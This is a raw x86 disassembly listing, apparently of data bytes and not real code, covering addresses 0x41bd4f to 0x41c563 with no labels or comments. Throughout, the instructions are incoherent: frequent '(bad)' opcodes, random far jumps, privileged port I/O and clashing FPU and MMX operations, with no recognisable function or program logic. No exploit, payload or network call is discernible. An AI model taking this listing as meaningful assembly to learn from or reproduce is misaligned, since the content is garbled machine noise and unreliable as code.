  41bd4f:	div    esi
  41bd51:	mov    al,0xc7
  41bd53:	int    0xf9
  41bd55:	mov    ebx,0xf1c4d8ff
  41bd5a:	sar    DWORD PTR [esi-0x472902ff],cl
  41bd60:	repz pop es
  41bd62:	clc    
  41bd63:	jmp    0x41bd5b
  41bd65:	push   es
  41bd66:	in     al,0xed
  41bd68:	add    bl,cl
  41bd6a:	or     DWORD PTR [edi],ecx
  41bd6c:	scas   eax,DWORD PTR es:[edi]
  41bd6d:	jecxz  0x41bd2d
  41bd6f:	repz out 0xe0,al
  41bd72:	hlt    
  41bd73:	hlt    
  41bd74:	aad    0xeb
  41bd76:	cli    
  41bd77:	jmp    0xcdcc:0xd7fefde4
  41bd7e:	rol    ecx,0xfb
  41bd81:	loope  0x41bd59
  41bd83:	fiadd  WORD PTR ds:0xcde1ffdd
  41bd89:	retf   
  41bd8a:	(bad)
  41bd8d:	out    dx,al
  41bd8e:	ret    
  41bd8f:	ret    
  41bd90:	shr    dl,1
  41bd92:	rcl    ch,0xc9
  41bd95:	out    dx,eax
  41bd96:	retf   0xf2fd
  41bd99:	mov    eax,0xbdd2fbcc
  41bd9e:	out    dx,eax
  41bd9f:	mov    ebp,0xf6d9c0bd
  41bda4:	(bad)  
  41bda6:	add    BYTE PTR [esi],cl
  41bda8:	fisttp WORD PTR [eax]
  41bdaa:	loopne 0x41bd79
  41bdac:	lods   eax,DWORD PTR ds:[esi]
  41bdad:	in     eax,0xdd
  41bdaf:	(bad)  
  41bdb0:	loopne 0x41bd7e
  41bdb2:	(bad)
  41bdb5:	shl    ch,1
  41bdb7:	mov    edx,0xb0dfb9f2
  41bdbc:	(bad)  
  41bdbe:	into   
  41bdbf:	add    esi,ebx
  41bdc1:	cld    
  41bdc2:	jmp    0x41bdb6
  41bdc4:	ret    0xeed5
  41bdc7:	(bad)  
  41bdc8:	retf   
  41bdc9:	ffreep st(1)
  41bdcb:	in     eax,dx
  41bdcc:	iret   
  41bdcd:	(bad)  
  41bdce:	lock mov bl,0xf6
  41bdd1:	jecxz  0x41bd80
  41bdd3:	hlt    
  41bdd4:	in     eax,0xef
  41bdd6:	mov    ah,0xfa
  41bdd8:	repz enter 0xde02,0xdb
  41bddd:	mov    esi,0xe5fbfdce
  41bde2:	add    ah,bl
  41bde4:	or     dl,al
  41bde6:	mov    ebp,0xdf0304ea
  41bdeb:	out    dx,al
  41bdec:	retf   
  41bded:	lds    esi,FWORD PTR [edi-0xe102f38]
  41bdf3:	(bad)  
  41bdf4:	sti    
  41bdf5:	mov    dh,0xd3
  41bdf7:	std    
  41bdf8:	mov    eax,0xf2facef4
  41bdfd:	mov    ecx,0x1d8dbed
  41be02:	test   BYTE PTR ds:0xe205fac9,0xfa
  41be09:	bswap  esi
  41be0b:	or     BYTE PTR [edi+eiz*8-0x4b141b34],ch
  41be12:	loop   0x41bdd5
  41be14:	mov    ebx,0xcae9f5f3
  41be19:	mov    ah,0xb5
  41be1b:	mov    esp,0xc7fdd5
  41be20:	add    dh,bh
  41be22:	out    0xcb,al
  41be24:	aad    0xb
  41be26:	loop   0x41be20
  41be28:	out    0xcb,eax
  41be2a:	add    esp,esp
  41be2c:	mov    esp,0xdccde8af
  41be31:	lods   eax,DWORD PTR ds:[esi]
  41be32:	in     al,dx
  41be33:	iret   
  41be34:	int3   
  41be35:	in     eax,dx
  41be36:	mov    ah,0xec
  41be38:	fcmovnu st,st(5)
  41be3a:	add    esp,ecx
  41be3c:	hlt    
  41be3d:	int    0xfa
  41be3f:	not    al
  41be41:	add    al,BYTE PTR [edx]
  41be43:	clc    
  41be44:	(bad)  
  41be46:	fsubrp st(3),st
  41be48:	or     eax,0xbfce0b04
  41be4d:	jmp    0xc8229f14
  41be52:	in     eax,dx
  41be53:	sti    
  41be54:	in     al,0xff
  41be56:	mov    dh,0xf6
  41be58:	leave  
  41be59:	mov    edx,0xf4ccd7d9
  41be5e:	mov    ecx,0xf4daf3d8
  41be63:	clc    
  41be64:	jmp    0xe80c:0xdae3eac1
  41be6b:	fdivrp st(2),st
  41be6d:	lods   al,BYTE PTR ds:[esi]
  41be6e:	rol    esi,cl
  41be70:	ret    
  41be71:	icebp  
  41be72:	sti    
  41be73:	aam    0xb6
  41be75:	in     al,dx
  41be76:	in     al,0xfa
  41be78:	test   ah,0xd7
  41be7b:	hlt    
  41be7c:	ret    0xfa00
  41be7f:	into   
  41be80:	int3   
  41be81:	lock add edx,ebx
  41be84:	sti    
  41be85:	retf   0xe10e
  41be88:	loopne 0x41be8e
  41be8a:	add    DWORD PTR [edi],eax
  41be8c:	jmp    0xb61f9e50
  41be91:	int3   
  41be92:	mov    cl,0xc8
  41be94:	retf   
  41be95:	mov    bh,0xec
  41be97:	in     al,dx
  41be98:	mov    ch,0xbb
  41be9a:	sar    DWORD PTR [esp+edi*4-0x20201c23],cl
  41bea1:	stc    
  41bea2:	mov    ebp,0xc6ef0606
  41bea7:	retf   
  41bea8:	sti    
  41bea9:	or     ah,bh
  41beab:	(bad)  
  41bead:	mov    eax,0xc4f4c9ae
  41beb2:	leave  
  41beb3:	shl    DWORD PTR [eax-0xb4f3333],cl
  41beb9:	mov    ebp,0xcebdd2f4
  41bebe:	in     eax,dx
  41bebf:	add    al,dl
  41bec1:	fiadd  DWORD PTR [eax]
  41bec3:	or     dl,al
  41bec5:	hlt    
  41bec6:	add    ah,dl
  41bec8:	lds    eax,FWORD PTR [esi]
  41beca:	or     esp,eax
  41becc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41becd:	mov    eax,0xc3e0ecd2
  41bed2:	mov    ah,0xec
  41bed4:	mov    cl,0xe5
  41bed6:	into   
  41bed7:	iret   
  41bed8:	aad    0xd6
  41beda:	mov    ebp,0xfebdb9fe
  41bedf:	sar    ebx,0xe5
  41bee2:	stc    
  41bee3:	add    ebp,ecx
  41bee5:	(bad)  
  41bee7:	or     eax,0xecbe9ed
  41beec:	shr    bh,1
  41beee:	retf   
  41beef:	bnd ret 
  41bef1:	out    dx,eax
  41bef2:	xlat   BYTE PTR ds:[ebx]
  41bef3:	leave  
  41bef4:	int    0xd5
  41bef6:	fdiv   st,st(6)
  41bef8:	retf   0xbdcf
  41befb:	leave  
  41befc:	loope  0x41beb7
  41befe:	cmc    
  41beff:	cli    
  41bf00:	add    al,BYTE PTR [ecx]
  41bf02:	or     edi,edi
  41bf04:	jmp    0x12fe:0xeff6dcdf
  41bf0b:	loope  0x41bef4
  41bf0d:	retf   0xefc1
  41bf10:	leave  
  41bf11:	loopne 0x41beed
  41bf13:	repz clc 
  41bf15:	in     eax,0xd8
  41bf17:	clc    
  41bf18:	jmp    0xe8fe87d5
  41bf1d:	mov    edi,0xf6dee3f0
  41bf22:	ffreep st(1)
  41bf24:	hlt    
  41bf25:	aad    0xda
  41bf27:	pmuludq mm5,mm1
  41bf2a:	push   cs
  41bf2b:	add    al,0xe7
  41bf2d:	fmulp  st(2),st
  41bf2f:	rcr    esp,0xcb
  41bf32:	hlt    
  41bf33:	in     al,0xcb
  41bf35:	fnsetpm(287 only) 
  41bf37:	xlat   BYTE PTR ds:[ebx]
  41bf38:	mov    ebx,0xbd01bad2
  41bf3d:	add    ah,ch
  41bf3f:	rcr    al,0xfb
  41bf42:	inc    BYTE PTR [edi]
  41bf44:	(bad)  
  41bf46:	mov    DWORD PTR ds:0xea0edc09,0xede1b8e9
  41bf50:	cmc    
  41bf51:	jecxz  0x41bf38
  41bf53:	repz mov al,0xf1
  41bf56:	jmp    0xd6d3:0xc3d2c4c9
  41bf5d:	rcl    ebx,0xfe
  41bf60:	in     eax,0xf9
  41bf62:	fcomi  st,st(6)
  41bf64:	loope  0x41bf2b
  41bf66:	clc    
  41bf67:	add    ch,al
  41bf69:	loopne 0x41bf44
  41bf6b:	cli    
  41bf6c:	icebp  
  41bf6d:	fsubr  st(5),st
  41bf6f:	repnz repz repnz imul edi
  41bf74:	retf   
  41bf75:	(bad)  
  41bf76:	out    0xb7,eax
  41bf78:	(bad)  
  41bf79:	(bad)  
  41bf7b:	mov    esp,0xe3ddfbfa
  41bf80:	fdivr  QWORD PTR [edx+ecx*1+0x2fabfe5]
  41bf87:	cld    
  41bf88:	or     ecx,ecx
  41bf8a:	or     edx,DWORD PTR [ebx]
  41bf8c:	into   
  41bf8d:	mov    al,0xca
  41bf8f:	out    dx,al
  41bf90:	retf   0xb6cd
  41bf93:	in     al,0xe6
  41bf95:	int3   
  41bf96:	push   DWORD PTR [eax+ebp*8+0x1eacef0]
  41bf9d:	into   
  41bf9e:	std    
  41bf9f:	loope  0x41bf72
  41bfa1:	mov    ebp,0x2fb07ea
  41bfa6:	in     eax,0xdb
  41bfa8:	add    ah,al
  41bfaa:	enter  0xece4,0xaf
  41bfae:	scas   al,BYTE PTR es:[edi]
  41bfaf:	in     al,dx
  41bfb0:	(bad)  
  41bfb1:	in     eax,dx
  41bfb2:	in     al,0xe0
  41bfb4:	cli    
  41bfb5:	ror    cl,1
  41bfb7:	lods   al,BYTE PTR ds:[esi]
  41bfb8:	lock mov ebp,0xbfd6cfb4
  41bfbe:	loope  0x41bfba
  41bfc0:	int3   
  41bfc1:	ret    0xdef2
  41bfc4:	(bad)  
  41bfc6:	add    BYTE PTR [edi],al
  41bfc8:	fyl2xp1 
  41bfca:	int    0xa
  41bfcc:	mov    ebp,0xd3d0e3f3
  41bfd1:	mov    dh,0xf1
  41bfd3:	aad    0xd5
  41bfd5:	mov    ebx,0xb9e5cbed
  41bfda:	mov    esi,0xe3f5d3b8
  41bfdf:	in     al,dx
  41bfe0:	rcr    esi,cl
  41bfe2:	test   edi,0xe8febe09
  41bfe8:	add    ecx,eax
  41bfea:	call   0xe51168fb
  41bfef:	rcl    ch,0xf4
  41bff2:	sti    
  41bff3:	rcl    esp,1
  41bff5:	mov    ch,0xe4
  41bff7:	call   0xc32a72db
  41bffc:	(bad)  
  41bffe:	repz repz fiadd DWORD PTR [esi]
  41c002:	mov    ecx,0xe2e4e305
  41c007:	retf   
  41c008:	or     cl,al
  41c00a:	jmp    0xb1ee:0xdcafd2dc
  41c011:	loop   0x41bfff
  41c013:	call   0xe62f8103
  41c018:	lock retf 0xd4f0
  41c01c:	test   DWORD PTR [edi],0xe0f6ede3
  41c022:	cld    
  41c023:	repnz cmc 
  41c025:	(bad)  
  41c026:	inc    bh
  41c028:	jmp    0xc22fd407
  41c02d:	retf   
  41c02e:	test   ebp,0xcdc7b0bd
  41c034:	fprem1 
  41c036:	(bad)  
  41c037:	lods   al,BYTE PTR ds:[esi]
  41c038:	retf   0xe3b5
  41c03b:	mov    ecx,0x3c7c1dd
  41c040:	call   edx
  41c042:	push   es
  41c043:	loopne 0x41c009
  41c045:	fcomp  st(1)
  41c047:	retf   
  41c048:	loop   0x41c03e
  41c04a:	out    0xe4,eax
  41c04c:	test   al,0xa9
  41c04e:	fnsave [eax-0x3e371640]
  41c054:	in     al,dx
  41c055:	retf   
  41c056:	iret   
  41c057:	in     al,0xf4
  41c059:	mov    esp,0xd201f2fb
  41c05e:	(bad)  
  41c060:	out    0xc1,al
  41c062:	jecxz  0x41c061
  41c064:	stc    
  41c065:	out    dx,eax
  41c066:	in     eax,0xf9
  41c068:	iret   
  41c069:	into   
  41c06a:	push   es
  41c06b:	std    
  41c06c:	mov    esp,0xcecec3c0
  41c071:	iret   
  41c072:	in     al,0xc8
  41c074:	in     al,0xfa
  41c076:	mov    ecx,0xfdeddfd7
  41c07b:	sti    
  41c07c:	loope  0x41c038
  41c07e:	(bad)  
  41c080:	inc    dl
  41c082:	cld    
  41c083:	add    dh,al
  41c085:	hlt    
  41c086:	add    eax,0x313e9de
  41c08b:	fdivr  QWORD PTR [ebx+edx*8-0x3b3c4c12]
  41c092:	loopne 0x41c081
  41c094:	int    0xe6
  41c096:	call   0xed39a973
  41c09b:	shr    ebp,1
  41c09d:	mov    ecx,0x2def403
  41c0a2:	(bad)
  41c0a5:	imul   edx
  41c0a7:	add    ebp,esp
  41c0a9:	jecxz  0x41c0a6
  41c0ab:	icebp  
  41c0ac:	jmp    0xe2f5:0xc5eed3f7
  41c0b3:	mov    bl,0xf5
  41c0b5:	int3   
  41c0b6:	(bad)  
  41c0b7:	idiv   DWORD PTR [eax-0x24204e4b]
  41c0bd:	cld    
  41c0be:	add    edx,edi
  41c0c0:	ret    
  41c0c1:	rcr    edi,cl
  41c0c3:	add    eax,0xd0ff001
  41c0c8:	fld    DWORD PTR [esi]
  41c0ca:	(bad)
  41c0cd:	call   0xae189f80
  41c0d2:	out    0xf0,al
  41c0d4:	clc    
  41c0d5:	loopne 0x41c0c5
  41c0d7:	in     eax,0xd2
  41c0d9:	in     al,dx
  41c0da:	stc    
  41c0db:	into   
  41c0dc:	add    bl,dl
  41c0de:	fstp   st(1)
  41c0e0:	sti    
  41c0e1:	stc    
  41c0e2:	in     al,0xf7
  41c0e4:	rol    dh,0xef
  41c0e7:	pop    es
  41c0e8:	add    al,0xff
  41c0ea:	call   0xcf2f9cf6
  41c0ef:	loopne 0x41c0c7
  41c0f1:	(bad)  
  41c0f2:	out    0xd7,al
  41c0f4:	fcmove st,st(2)
  41c0f6:	in     eax,0xf2
  41c0f8:	mov    esi,0xf002f7dd
  41c0fd:	hlt    
  41c0fe:	add    ah,dh
  41c100:	aad    0xf3
  41c102:	fadd   st,st(7)
  41c104:	(bad)  
  41c106:	out    0x0,eax
  41c108:	jecxz  0x41c0e7
  41c10a:	int3   
  41c10b:	in     eax,0xc5
  41c10d:	mov    dl,0xf7
  41c10f:	ret    0xdcef
  41c112:	iret   
  41c113:	mov    dl,0xfb
  41c115:	into   
  41c116:	cli    
  41c117:	aad    0xeb
  41c119:	(bad)  
  41c11b:	imul   dh
  41c11d:	repnz loope 0x41c114
  41c120:	loopne 0x41c0e2
  41c122:	repnz fdiv st,st(6)
  41c125:	fcom   st(7)
  41c127:	mov    esp,0x2dfe307
  41c12c:	mov    esp,0xf1d7edc2
  41c131:	aad    0xe1
  41c133:	stc    
  41c134:	repnz into 
  41c136:	int    0xb4
  41c138:	mov    bl,0xcf
  41c13a:	sar    bl,cl
  41c13c:	(bad)  
  41c13e:	iret   
  41c13f:	mov    ebp,0x4f1f2d9
  41c144:	(bad)  
  41c145:	call   0x3e8d12
  41c14a:	stc    
  41c14b:	adc    DWORD PTR [ebp-0x122d3317],edi
  41c151:	xlat   BYTE PTR ds:[ebx]
  41c152:	mov    ch,0xb6
  41c154:	shr    cl,0xea
  41c157:	in     eax,0xd1
  41c159:	iret   
  41c15a:	loop   0x41c153
  41c15c:	stc    
  41c15d:	repz cmc 
  41c15f:	(bad)  
  41c161:	lock rcl al,cl
  41c164:	ret    
  41c165:	rol    bh,0xd9
  41c168:	std    
  41c169:	repz add ecx,DWORD PTR [eax]
  41c16c:	in     eax,0xbc
  41c16e:	retf   0xddea
  41c171:	int    0xbb
  41c173:	into   
  41c174:	lock mov bh,0xb1
  41c177:	(bad)  
  41c178:	leave  
  41c179:	fnsave [ebp-0xc26012e]
  41c17f:	in     al,dx
  41c180:	cld    
  41c181:	ror    BYTE PTR [ebx],1
  41c183:	add    al,0xe8
  41c185:	(bad)  
  41c186:	fimul  DWORD PTR [edx]
  41c188:	in     eax,0xe0
  41c18a:	fimul  DWORD PTR [ecx]
  41c18c:	out    0xbd,eax
  41c18e:	jmp    0xb0f7ac78
  41c193:	aad    0xb9
  41c195:	aad    0xd3
  41c197:	out    0xeb,al
  41c199:	(bad)  
  41c19b:	repz aad 0x0
  41c19e:	add    dl,dl
  41c1a0:	test   BYTE PTR [ecx],0xf1
  41c1a3:	(bad)  
  41c1a5:	add    bh,ah
  41c1a7:	out    dx,eax
  41c1a8:	jecxz  0x41c198
  41c1aa:	inc    esp
  41c1ac:	ret    0xe8bc
  41c1af:	ror    bh,0xc5
  41c1b2:	(bad)  
  41c1b3:	shl    ebp,cl
  41c1b5:	rol    ch,cl
  41c1b7:	in     al,0xfa
  41c1b9:	mov    esi,0xf3c1ffce
  41c1be:	repnz int 0xda
  41c1c1:	in     al,dx
  41c1c2:	shl    esp,0xc4
  41c1c5:	pandn  mm6,mm6
  41c1c8:	retf   
  41c1c9:	out    0xfa,eax
  41c1cb:	sar    BYTE PTR [ecx+ebp*8-0x55171936],cl
  41c1d2:	(bad)  
  41c1d5:	div    eax
  41c1d7:	call   0xcafabfce
  41c1dc:	fcmovnu st,st(2)
  41c1de:	out    0xc3,eax
  41c1e0:	aam    0xc2
  41c1e2:	add    esp,ebx
  41c1e4:	or     ebp,edi
  41c1e6:	out    0xe3,al
  41c1e8:	leave  
  41c1e9:	into   
  41c1ea:	out    0xa,eax
  41c1ec:	retf   0xe7ee
  41c1ef:	call   0xd105a7a6
  41c1f4:	cli    
  41c1f5:	aam    0xbb
  41c1f7:	lods   al,BYTE PTR ds:[esi]
  41c1f8:	mov    bl,0xf8
  41c1fa:	fucomip st,st(0)
  41c1fc:	repnz (bad) 
  41c1ff:	mov    edi,0x2f7e3f4
  41c204:	hlt    
  41c205:	loop   0x41c208
  41c207:	add    ch,ch
  41c209:	in     al,0xdc
  41c20b:	out    dx,eax
  41c20c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c20d:	mov    edi,0xefddd5a5
  41c212:	jmp    0xbb028fe7
  41c217:	mov    bh,0xd7
  41c219:	repz repz retf 0xd1f4
  41c21e:	iret   
  41c21f:	add    eax,0xe7e3e6fc
  41c224:	xlat   BYTE PTR ds:[ebx]
  41c225:	fild   WORD PTR [edi+ebp*8]
  41c228:	fcmovne st,st(2)
  41c22a:	out    0xe7,eax
  41c22c:	retf   
  41c22d:	loop   0x41c1d8
  41c22f:	in     al,0xc7
  41c231:	retf   0xecdb
  41c234:	stc    
  41c235:	les    esi,FWORD PTR [eax-0x80e4c2d]
  41c23b:	fistp  QWORD PTR [eax-0x2e472a0a]
  41c241:	sti    
  41c242:	ret    
  41c243:	jmp    0x41c204
  41c245:	(bad)  
  41c247:	cli    
  41c248:	into   
  41c249:	add    ch,bl
  41c24b:	fcomip st,st(1)
  41c24d:	in     al,dx
  41c24e:	test   eax,0xb2f1ece9
  41c253:	xlat   BYTE PTR ds:[ebx]
  41c254:	retf   0xcdd0
  41c257:	shl    ebx,1
  41c259:	mov    eax,0x3e9ccf9
  41c25e:	shl    al,cl
  41c260:	stc    
  41c261:	icebp  
  41c262:	fisttp QWORD PTR [ebx]
  41c264:	or     dh,al
  41c266:	xlat   BYTE PTR ds:[ebx]
  41c267:	loope  0x41c251
  41c269:	out    dx,eax
  41c26a:	clc    
  41c26b:	or     al,0xe3
  41c26d:	int    0xe9
  41c26f:	div    DWORD PTR [ecx-0x1e2c3d2c]
  41c275:	out    dx,al
  41c276:	mov    bh,0xc4
  41c278:	sti    
  41c279:	in     al,dx
  41c27a:	fdivr  st(5),st
  41c27c:	add    al,dl
  41c27e:	cld    
  41c27f:	add    edi,ebx
  41c281:	mov    ebp,0xf8c506e1
  41c286:	push   cs
  41c287:	out    0xfb,al
  41c289:	cli    
  41c28a:	or     dl,dl
  41c28c:	out    dx,eax
  41c28d:	shr    DWORD PTR [ecx-0x44130837],1
  41c293:	leave  
  41c294:	retf   0xebd5
  41c297:	fucomip st,st(3)
  41c299:	mov    edi,0xf5f1c9f4
  41c29e:	loopne 0x41c295
  41c2a0:	fdiv   st,st(3)
  41c2a2:	aad    0xd0
  41c2a4:	loopne 0x41c2a2
  41c2a6:	add    al,al
  41c2a8:	add    al,0x0
  41c2aa:	iret   
  41c2ab:	out    dx,al
  41c2ac:	mov    esi,0xd2aed0e9
  41c2b1:	sar    bl,0xd1
  41c2b4:	mov    dh,0xc4
  41c2b6:	aam    0xde
  41c2b8:	enter  0xb5bf,0xcd
  41c2bc:	leave  
  41c2bd:	hlt    
  41c2be:	mov    ecx,0xc5f6f6f6
  41c2c3:	rol    BYTE PTR [edi],cl
  41c2c5:	(bad)  
  41c2c6:	fsubp  st(2),st
  41c2c8:	jecxz  0x41c2a9
  41c2ca:	bswap  edx
  41c2cc:	shl    ch,0xa5
  41c2cf:	jmp    0xd6cf:0xf3b1eff3
  41c2d6:	aad    0xeb
  41c2d8:	fcom   st(3)
  41c2da:	into   
  41c2db:	(bad)  
  41c2dd:	aam    0x7
  41c2df:	mov    esi,0x90ad2d5
  41c2e4:	fincstp 
  41c2e6:	or     eax,ecx
  41c2e8:	fxtract 
  41c2ea:	retf   
  41c2eb:	iret   
  41c2ec:	(bad)
  41c2ef:	mov    ebp,0xd3f3d5d5
  41c2f4:	call   0xe61d8cc0
  41c2f9:	out    dx,eax
  41c2fa:	clc    
  41c2fb:	loope  0x41c2ce
  41c2fd:	fcomp  st(4)
  41c2ff:	add    eax,0xf202dcc6
  41c304:	(bad)  
  41c305:	ffreep st(4)
  41c307:	or     ch,bh
  41c309:	in     eax,0xd
  41c30b:	or     eax,0xaeeec9b1
  41c310:	fst    st(0)
  41c312:	mov    ch,0xf5
  41c314:	fcmovne st,st(2)
  41c316:	mov    ecx,0xbfccfeda
  41c31b:	jmp    0xd7219ce1
  41c320:	fld    st(5)
  41c322:	ror    BYTE PTR [edx],0xc7
  41c325:	fdivr  st,st(1)
  41c327:	aam    0xff
  41c329:	out    0xfa,eax
  41c32b:	std    
  41c32c:	in     eax,0xe7
  41c32e:	retf   
  41c32f:	fsubr  QWORD PTR [esi-0x380e1305]
  41c335:	call   0xbf0c98e7
  41c33a:	fcmovb st,st(2)
  41c33c:	cmc    
  41c33d:	add    DWORD PTR [ebp-0x2b0c3913],esi
  41c343:	hlt    
  41c344:	ror    dl,0x6
  41c347:	jmp    0xea22bd3b
  41c34c:	retf   0xc9ca
  41c34f:	shr    BYTE PTR [ebx-0x153b3a0a],1
  41c355:	(bad)  
  41c357:	rcr    edi,1
  41c359:	xlat   BYTE PTR ds:[ebx]
  41c35a:	fdivr  st(0),st
  41c35c:	stc    
  41c35d:	not    eax
  41c35f:	shl    al,1
  41c361:	cli    
  41c362:	fldl2t 
  41c364:	leave  
  41c365:	in     eax,0xd9
  41c367:	add    al,0xe
  41c369:	std    
  41c36a:	psubsb mm5,QWORD PTR [eax+esi*8-0xb0d5b3b]
  41c372:	xlat   BYTE PTR ds:[ebx]
  41c373:	mov    cl,0xcf
  41c375:	out    dx,al
  41c376:	in     al,0xf0
  41c378:	fsubp  st(3),st
  41c37a:	(bad)  
  41c37b:	jmp    0xff3e8759
  41c380:	vpsubb ymm0,ymm3,ymm4
  41c384:	ret    
  41c385:	hlt    
  41c386:	fyl2xp1 
  41c388:	aad    0xd
  41c38a:	push   cs
  41c38b:	out    0xaf,eax
  41c38d:	out    0xc4,eax
  41c38f:	mov    al,0xc3
  41c391:	in     al,dx
  41c392:	rcl    esi,1
  41c394:	retf   0xccd8
  41c397:	idiv   DWORD PTR [edi-0x1e350822]
  41c39d:	icebp  
  41c39e:	icebp  
  41c39f:	fsubr  st,st(4)
  41c3a1:	(bad)  
  41c3a4:	rcr    edi,1
  41c3a6:	loopne 0x41c3a2
  41c3a8:	jmp    0xe602a0a1
  41c3ad:	imul   eax
  41c3af:	mov    cl,0xf0
  41c3b1:	mov    al,0xd3
  41c3b3:	les    esi,FWORD PTR [esi-0x2b0c0e28]
  41c3b9:	div    bl
  41c3bb:	(bad)  
  41c3bc:	into   
  41c3bd:	mov    eax,0xf3dbfcf6
  41c3c2:	or     al,BYTE PTR [esi]
  41c3c4:	(bad)  
  41c3c5:	jecxz  0x41c3b1
  41c3c7:	psubsb mm1,mm0
  41c3ca:	fsubrp st(5),st
  41c3cc:	jmp    0xe13080b4
  41c3d1:	loop   0x41c3c9
  41c3d3:	stc    
  41c3d4:	into   
  41c3d5:	fcomp  st(6)
  41c3d7:	push   eax
  41c3d9:	(bad)  
  41c3db:	add    cl,ah
  41c3dd:	add    dh,bh
  41c3df:	icebp  
  41c3e0:	rol    dl,1
  41c3e2:	add    ch,bl
  41c3e4:	jmp    0x41c3e5
  41c3e6:	pop    es
  41c3e7:	push   es
  41c3e8:	jmp    0x41c3d3
  41c3ea:	(bad)  
  41c3eb:	(bad)  
  41c3ec:	jmp    0xac038497
  41c3f1:	lock (bad) 
  41c3f4:	out    0xf5,eax
  41c3f6:	mov    eax,0xefd5daca
  41c3fb:	mov    eax,0xd9d503d4
  41c400:	jecxz  0x41c3f8
  41c402:	repz icebp 
  41c404:	shl    cl,0xfb
  41c407:	out    0xb,eax
  41c409:	hlt    
  41c40a:	or     al,0xeb
  41c40c:	mov    dl,0xbd
  41c40e:	jecxz  0x41c3f7
  41c410:	lock stos BYTE PTR es:[edi],al
  41c412:	test   eax,0xf8c5c9b5
  41c417:	(bad)  
  41c418:	in     eax,dx
  41c419:	fdivrp st(0),st
  41c41b:	fcmovbe st,st(1)
  41c41d:	jecxz  0x41c3de
  41c41f:	int3   
  41c420:	rcl    ebx,cl
  41c422:	hlt    
  41c423:	(bad)  
  41c424:	in     eax,0xc5
  41c426:	add    eax,0xe300fbe9
  41c42b:	pop    es
  41c42c:	jmp    0x41c3f9
  41c42e:	shl    BYTE PTR [ebx-0x2e2e4a31],0xf0
  41c435:	scas   al,BYTE PTR es:[edi]
  41c436:	mov    bh,0xba
  41c438:	hlt    
  41c439:	out    dx,eax
  41c43a:	jmp    0x41c40e
  41c43c:	fdivr  DWORD PTR [edi-0x45320c39]
  41c442:	cli    
  41c443:	retf   0xddfd
  41c446:	psubb  mm7,mm3
  41c449:	iret   
  41c44a:	out    dx,eax
  41c44b:	adc    DWORD PTR [eax-0x43191331],ebp
  41c451:	idiv   edx
  41c453:	sti    
  41c454:	mov    al,0xf7
  41c456:	not    eax
  41c458:	jmp    0xfaf5:0xf7dbbff0
  41c45f:	in     eax,dx
  41c460:	xlat   BYTE PTR ds:[ebx]
  41c461:	add    ah,dh
  41c463:	(bad)  
  41c464:	cli    
  41c465:	or     DWORD PTR [eax+ebx*8],eax
  41c468:	aad    0xc6
  41c46a:	or     DWORD PTR [ebx],edx
  41c46c:	sar    DWORD PTR [eax-0x5331303d],1
  41c472:	into   
  41c473:	int    0xb0
  41c475:	retf   
  41c476:	int3   
  41c477:	mov    bh,0xb8
  41c479:	iret   
  41c47a:	call   0xedfbbf4e
  41c47f:	add    dh,cl
  41c481:	stc    
  41c482:	or     edi,DWORD PTR [eax-0x1cf63e29]
  41c488:	out    0x6,al
  41c48a:	in     eax,0xcf
  41c48c:	icebp  
  41c48d:	repnz loop 0x41c482
  41c490:	loop   0x41c486
  41c492:	mov    bh,0xac
  41c494:	cmc    
  41c495:	int3   
  41c496:	fcmovne st,st(4)
  41c498:	fmul   st(0),st
  41c49a:	jecxz  0x41c496
  41c49c:	cld    
  41c49d:	rcl    bl,0xe0
  41c4a0:	cmc    
  41c4a1:	hlt    
  41c4a2:	(bad)  
  41c4a3:	lock aad 0xf9
  41c4a6:	add    ebp,ebp
  41c4a8:	fiadd  DWORD PTR [edi*8-0x39143a27]
  41c4af:	shr    BYTE PTR [edi-0x4c06362b],cl
  41c4b5:	in     al,dx
  41c4b6:	repz mov bh,0xf0
  41c4b9:	div    DWORD PTR [ebp-0x20413c48]
  41c4bf:	shr    ebp,0xd0
  41c4c2:	add    dh,bl
  41c4c4:	(bad)  
  41c4c6:	aam    0x9
  41c4c8:	fldl2t 
  41c4ca:	loope  0x41c4db
  41c4cc:	scas   al,BYTE PTR es:[edi]
  41c4cd:	repnz mov cl,0xf5
  41c4d0:	lods   al,BYTE PTR ds:[esi]
  41c4d1:	(bad)  
  41c4d2:	sar    ecx,cl
  41c4d4:	fcmovne st,st(6)
  41c4d6:	mov    cl,0xd7
  41c4d8:	in     al,dx
  41c4d9:	lock aad 0xe2
  41c4dc:	cld    
  41c4dd:	rol    BYTE PTR [ebx],0xc7
  41c4e0:	ret    
  41c4e1:	fcomi  st,st(0)
  41c4e3:	out    0x9,eax
  41c4e5:	add    bh,cl
  41c4e7:	add    al,0xcd
  41c4e9:	cli    
  41c4ea:	into   
  41c4eb:	cli    
  41c4ec:	enter  0xacf3,0xbc
  41c4f0:	aad    0xca
  41c4f2:	mov    bh,0xf1
  41c4f4:	loopne 0x41c4ea
  41c4f6:	mov    dh,0xf6
  41c4f8:	int3   
  41c4f9:	(bad)  
  41c4fa:	(bad)  
  41c4fc:	std    
  41c4fd:	repz std 
  41c4ff:	mov    cl,0x7
  41c502:	add    ecx,ebp
  41c504:	sti    
  41c505:	enter  0xe1ee,0xf5
  41c509:	cli    
  41c50a:	or     bh,dh
  41c50c:	stos   DWORD PTR es:[edi],eax
  41c50d:	in     eax,0xc5
  41c50f:	(bad)  
  41c510:	xlat   BYTE PTR ds:[ebx]
  41c511:	hlt    
  41c512:	in     al,dx
  41c513:	mov    bl,0xec
  41c515:	in     eax,0xcb
  41c517:	(bad)  
  41c518:	mov    ebx,0xcceed6f5
  41c51d:	rcl    bl,cl
  41c51f:	cli    
  41c520:	stc    
  41c521:	aam    0x4
  41c523:	mov    eax,0xe7f4d5f0
  41c528:	or     eax,0xcad202d9
  41c52d:	leave  
  41c52e:	enter  0xb1dc,0xbc
  41c532:	int3   
  41c533:	mov    al,0xf4
  41c535:	mov    ecx,0xf2cef9f2
  41c53a:	clc    
  41c53b:	(bad)  
  41c53d:	add    esi,esi
  41c53f:	stc    
  41c540:	mov    ebp,0xff05dbc1
  41c545:	(bad)  
  41c547:	iret   
  41c548:	jmp    0x41c50f
  41c54a:	int    0xf2
  41c54c:	lods   eax,DWORD PTR ds:[esi]
  41c54d:	enter  0xd7ef,0xd7
  41c551:	shr    BYTE PTR [ebp-0x1a09071c],1
  41c557:	rcr    ch,1
  41c559:	mov    dh,0xf4
  41c55b:	loop   0x41c555
  41c55d:	mov    ebp,0xe7d701f2
  41c562:	pop    es
  41c563:	fincstp 
